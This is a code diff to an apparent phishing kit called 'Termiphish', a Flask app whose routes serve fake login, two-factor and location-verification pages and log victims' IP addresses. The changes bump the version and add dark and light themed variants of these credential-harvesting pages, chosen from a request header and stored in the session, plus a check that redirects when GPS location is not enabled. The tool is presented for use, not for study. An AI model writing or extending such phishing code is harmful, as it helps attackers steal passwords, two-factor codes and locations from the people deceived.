@@ -134,7 +134,7 @@ ___________                  .__       .__    .__       .__
              \/            \/   |__|        \/        \/     \/   
 """
     print(BLUE + banner + RESET)
-    print(CYAN + "Welcome to Termiphish!", "V1.2 by slizak_jan" + RESET)
+    print(CYAN + "Welcome to Termiphish!", "V1.3 by slizak_jan" + RESET)
     print(GREEN + "=================================" + RESET)
 
 def readable_time(timestamp):
@@ -578,8 +578,16 @@ def handle_screen_size():
 
 @app.route('/api/dyn_login')
 def dyn_login():
-    # Načtení a vrácení šablony dyn_login.html
-    return render_template('dyn_login.html')
+    color_scheme = request.headers.get('User-Color-Scheme', 'default')
+    session['color-scheme'] = color_scheme
+    #print(color_scheme)
+    if color_scheme == 'dark':
+        return render_template('dyn_dark_login.html')
+    elif color_scheme == 'light':
+        return render_template('dyn_light_login.html')
+    else:
+        return render_template('dyn_light_login.html')
+
 
 @app.route('/api/login', methods=['POST'])
 def login_api():
@@ -758,6 +766,14 @@ def two_factor():
     except:
         return redirect("/")
     #print(sessionid)
+    color_scheme = session.get('color-scheme', 'default')
+    #print(color_scheme)
+    if color_scheme == 'dark':
+        return render_template('two_factor_dark.html')
+    elif color_scheme == 'light':
+        return render_template('two_factor_light.html')
+    else:
+        return render_template('two_factor_light.html')
     return render_template('two_factor.html')
 
 @app.route('/api/two_factor', methods=["POST"])
@@ -879,6 +895,9 @@ def location_authentication():
     user_agent = request.headers.get('User-Agent')
     lang = request.headers.get('Accept-Language')
 
+    if get_gps_location != True:
+        return redirect('/')
+
     if 'logged' in session:
         if session['logged'] == True:
             return logged_in(session)
@@ -890,7 +909,15 @@ def location_authentication():
         print(MAGENTA + f"{session['ipaddress']} is on location authentication.\n" + RESET)
     except KeyError:
         print(MAGENTA + f"Unknown ip is on location authentication.\n" + RESET)
-
+    
+    color_scheme = session.get('color-scheme', 'default')
+    #print(color_scheme)
+    if color_scheme == 'dark':
+        return render_template('location_dark.html')
+    elif color_scheme == 'light':
+        return render_template('location_light.html')
+    else:
+        return render_template('location_light.html')
     return render_template("location.html")
 
 @app.route("/api/location_authentication_config")
